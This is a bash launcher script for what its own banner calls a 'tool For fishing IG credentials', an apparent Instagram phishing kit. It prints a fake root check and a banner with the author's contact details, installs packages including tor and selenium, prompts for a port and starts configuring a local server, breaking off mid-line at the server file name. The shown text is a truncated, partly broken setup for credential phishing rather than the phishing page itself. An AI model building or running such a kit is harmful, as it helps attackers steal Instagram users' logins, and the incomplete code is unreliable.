#!/bin/bash

check_root() {
    [[ $EUID -eq 0 ]]
}

main() {
    echo -e "\033[92mCHECKING IF YOU'RE ROOTED..."
    loading_symbols=("/" "-" "\\" "|")
    i=0
    while true; do
        echo -ne "\rLoading${loading_symbols[i % ${#loading_symbols[@]}]}"
        ((i++))
        sleep 10
        if check_root; then
            break
        fi
    done

    if check_root; then
        echo -e "\033[92mYOU ARE ROOTED."
    else
        echo -e "\033[92mYOU ARE NOT ROOTED."
    fi
}

main

# Update packages and install dependencies
sudo apt-get update
sudo apt-get install -y php git curl python3 ruby tor bash python3-pip xidel python3-selenium

# Install npm
sudo apt-get install -y npm

# Display info
echo -e "\033[92m\n\n"
echo -e "\033[92m ______                          _____        ______              _____        ______       _____                   "
echo -e "\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        "
echo -e "\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   "
echo -e "\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        "
echo -e "\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   "

echo -e "\033[92m\n\n"
echo -e "\033[92m         ***********************************************"
echo -e "\033[92m         #                                             #"
echo -e "\033[92m         #   tool For fishing IG credentials #"
echo -e "\033[92m         #   Follow Me On Github: @ephraim sib#"
echo -e "\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#"
echo -e "\033[92m         #   Changelog: 5-12-2023           #"
echo -e "\033[92m         #                                             #"
echo -e "\033[92m         ***********************************************"
echo -e "\033[92m\n\n"

# Prompt user to enter a port number
validate_port() {
    if [[ ! $1 =~ ^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$ ]]; then
        return 1
    else
        return 0
    fi
}

run_server() {
    while true; do
        read -p "Please enter a port number (1024 to 65535): " port
        if validate_port "$port"; then
            break
        else
            echo "Invalid port number. Please enter a valid port number."
        fi
    done

    # Generate the link
    link="http://localhost:$port/"

    # Print the link
    echo "Generated link: $link"

    # Set the file to write log messages to
    logfile="server.log"

    # Set the file to run the server
    server_file="server.js

